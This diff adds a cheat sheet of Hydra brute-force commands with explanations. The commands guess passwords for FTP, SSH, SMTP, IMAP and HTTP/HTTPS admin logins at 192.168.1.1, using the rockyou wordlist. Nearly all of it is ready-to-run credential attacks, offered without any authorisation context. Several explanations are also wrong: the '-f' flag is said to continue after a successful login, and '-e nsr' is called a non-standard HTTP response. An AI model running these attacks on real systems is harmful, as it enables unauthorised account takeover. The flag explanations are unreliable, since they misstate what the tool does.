@@ -1,0 +1,52 @@
+    hydra -L users.txt -P passwords.txt ftp://192.168.1.1
+    
+    hydra -l user -P /usr/share/wordlists/rockyou.txt -s 22 -f ssh://192.168.1.1
+    
+    hydra -L users.txt -P passwords.txt -s 587 smtp://192.168.1.1
+    
+    hydra -l admin -P passwords.txt -f -v -t 4 -w 15 -s 80 -V http-get://192.168.1.1/admin
+    
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 80 -vV -o results.txt http-get://192.168.1.1/admin
+    
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 80 -vV -e nsr -o results.txt http-get://192.168.1.1/admin
+    
+    hydra -L users.txt -P passwords.txt -s 143 imap://192.168.1.1
+    
+    hydra -l admin -P passwords.txt -f -v -t 4 -w 15 -s 443 -V https-get://192.168.1.1/admin
+    
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 443 -vV -o results.txt https-get://192.168.1.1/admin
+    
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 443 -vV -e nsr -o results.txt https-get://192.168.1.1/admin 
+    
+    
+    Each of the one-liners above is a command for using the Hydra tool to perform brute force attacks against different types of protocols or services. 
+
+    hydra -L users.txt -P passwords.txt ftp://192.168.1.1
+    This command uses Hydra to perform a brute force attack against an FTP server with IP address 192.168.1.1, using a list of usernames from the file users.txt and a list of passwords from the file passwords.txt.
+
+    hydra -l user -P /usr/share/wordlists/rockyou.txt -s 22 -f ssh://192.168.1.1
+    This command uses Hydra to perform a brute force attack against an SSH server with IP address 192.168.1.1, using the username "user" and a list of passwords from the rockyou.txt wordlist file. It specifies the SSH port number 22 and enables the force mode (-f) to continue even after a successful login.
+
+    hydra -L users.txt -P passwords.txt -s 587 smtp://192.168.1.1
+    This command uses Hydra to perform a brute force attack against an SMTP server with IP address 192.168.1.1, using a list of usernames from the file users.txt and a list of passwords from the file passwords.txt. It specifies the SMTP port number 587.
+
+    hydra -l admin -P passwords.txt -f -v -t 4 -w 15 -s 80 -V http-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTP server with IP address 192.168.1.1, using the username "admin" and a list of passwords from the file passwords.txt. It specifies the HTTP port number 80 and enables verbose (-v) and verbose output (-V) options, and specifies the number of parallel threads (-t) and the timeout value (-w).
+
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 80 -vV -o results.txt http-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTP server with IP address 192.168.1.1, using the username "admin" and the rockyou.txt wordlist file for passwords. It specifies the HTTP port number 80, the number of parallel threads (-t), and enables verbose output (-vV) and output results to a file (-o).
+
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 80 -vV -e nsr -o results.txt http-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTP server with IP address 192.168.1.1, using the username "admin" and the rockyou.txt wordlist file for passwords. It specifies the HTTP port number 80, the number of parallel threads (-t), and enables verbose output (-vV), output results to a file (-o), and the non-standard HTTP response (-e nsr).
+
+    hydra -L users.txt -P passwords.txt -s 143 imap://192.168.1.1
+    This command uses Hydra to perform a brute force attack against an IMAP server with IP address 192.168.1.1, using a list of usernames from the file users.txt and a list of passwords from the file passwords.txt. It specifies the IMAP port number 143.
+    
+        hydra -l admin -P passwords.txt -f -v -t 4 -w 15 -s 443 -V https-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTPS server with IP address 192.168.1.1, using the username "admin" and a list of passwords from the file passwords.txt. It specifies the HTTPS port number 443 and enables verbose (-v) and verbose output (-V) options, and specifies the number of parallel threads (-t) and the timeout value (-w).
+
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 443 -vV -o results.txt https-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTPS server with IP address 192.168.1.1, using the username "admin" and the rockyou.txt wordlist file for passwords. It specifies the HTTPS port number 443, the number of parallel threads (-t), and enables verbose output (-vV) and output results to a file (-o).
+
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 16 -s 443 -vV -e nsr -o results.txt https-get://192.168.1.1/admin
+    This command uses Hydra to perform a brute force attack against an HTTPS server with IP address 192.168.1.1, using the username "admin" and the rockyou.txt wordlist file for passwords. It specifies the HTTPS port number 443, the number of parallel threads (-t), and enables verbose output (-vV), output results to a file (-o), and the non-standard HTTP response (-e nsr).
